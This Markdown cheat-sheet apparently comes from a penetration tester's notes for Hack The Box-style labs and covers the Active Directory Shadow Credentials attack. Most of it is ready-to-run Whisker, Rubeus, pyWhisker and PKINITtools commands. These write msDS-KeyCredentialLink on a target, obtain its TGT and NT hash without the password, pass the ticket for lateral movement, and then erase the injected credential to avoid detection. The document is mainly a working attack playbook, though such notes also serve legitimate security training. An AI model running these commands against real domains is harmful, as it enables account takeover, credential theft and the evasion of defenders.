# Shadow Credentials Attack

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

## Overview
Abuse `GenericWrite`/`GenericAll` over a user or computer to write to `msDS-KeyCredentialLink`, then authenticate via PKINIT to obtain TGT and NT hash without knowing the password.

## Enumeration

### Find Existing Shadow Credentials [added: 2026-04]
- **Tags:** #ShadowCredentials #KeyCredentialLink #Whisker #PowerView #PKINIT #T1556
- **Trigger:** Checking for existing shadow credential entries during enumeration
- **Prereq:** PowerView or Whisker binary; valid domain user context
- **Yields:** Accounts with existing msDS-KeyCredentialLink entries (may indicate prior compromise)
- **Opsec:** Low
- **Context:** Check if any accounts already have key credentials set
- **Payload/Method:**
  ```powershell
  # PowerView — find users with msDS-KeyCredentialLink set
  Get-DomainUser -Filter '(msDS-KeyCredentialLink=*)'

  # Whisker — list key credentials on a target
  .\Whisker.exe list /target:<TARGET>
  ```

## Exploitation — Windows

### Whisker + Rubeus Chain [added: 2026-04]
- **Tags:** #Whisker #Rubeus #ShadowCredentials #PKINIT #NTHash #GenericWrite #T1556
- **Trigger:** GenericWrite/GenericAll on target user or computer confirmed via BloodHound/ACL enum
- **Prereq:** GenericWrite/GenericAll over target; Whisker and Rubeus binaries; AD CS with PKINIT support
- **Yields:** TGT and NT hash of target account without knowing password
- **Opsec:** Med
- **Context:** Have GenericWrite/GenericAll over target — add shadow credential, get TGT, extract NT hash
- **Payload/Method:**
  ```powershell
  # Step 1: Add key credential to target
  .\Whisker.exe add /target:<TARGET>
  # Note the certificate and password output

  # Step 2: Request TGT using the certificate, extract NT hash
  .\Rubeus.exe asktgt /user:<TARGET> /certificate:<BASE64_CERT> /password:"<WHISKER_PASSWORD>" /domain:<DOMAIN> /dc:<DC> /getcredentials /show

  # Step 3: Create sacrificial logon session and inject ticket
  .\Rubeus.exe createnetonly /program:powershell.exe /show
  .\Rubeus.exe ptt /ticket:<BASE64_TGT>
  ```

## Exploitation — Linux

### pyWhisker + PKINITtools Chain [added: 2026-04]
- **Tags:** #pyWhisker #PKINITtools #ShadowCredentials #gettgtpkinit #LinuxAttack #T1556
- **Trigger:** GenericWrite/GenericAll on target confirmed; attacking from Linux
- **Prereq:** GenericWrite/GenericAll over target; pyWhisker and PKINITtools; AD CS with PKINIT
- **Yields:** TGT, NT hash, and ccache for target account via Linux tooling
- **Opsec:** Med
- **Context:** Same attack from Linux using pyWhisker and gettgtpkinit/getnthash
- **Payload/Method:**
  ```bash
  # Step 1: Add key credential
  python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASSWORD> --target <TARGET> --action add
  # Note the PFX file and password output

  # Step 2: Request TGT via PKINIT
  python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASSWORD> <DOMAIN>/<TARGET> <TARGET>.ccache

  # Step 3: Extract NT hash using the session key
  KRB5CCNAME=<TARGET>.ccache python3 getnthash.py -key <AS-REP_KEY> <DOMAIN>/<TARGET>

  # Step 4: Use the TGT for lateral movement
  KRB5CCNAME=<TARGET>.ccache smbclient.py -k -no-pass <DC_FQDN>
  ```

## Cleanup

### Remove Shadow Credentials [added: 2026-04]
- **Tags:** #ShadowCredentials #Whisker #Cleanup #KeyCredentialLink #ArtifactRemoval #T1070
- **Trigger:** After successful exploitation; need to clean up shadow credential artifacts
- **Prereq:** Whisker binary; knowledge of device ID from initial injection
- **Yields:** Removal of injected key credential to avoid detection
- **Opsec:** Low
- **Context:** Always clean up after exploitation to avoid detection
- **Payload/Method:**
  ```powershell
  # Remove specific key credential by device ID
  .\Whisker.exe remove /target:<TARGET> /deviceid:<DEVICEID>

  # Clear ALL key credentials (destructive — use with caution)
  .\Whisker.exe clear /target:<TARGET>
  ```
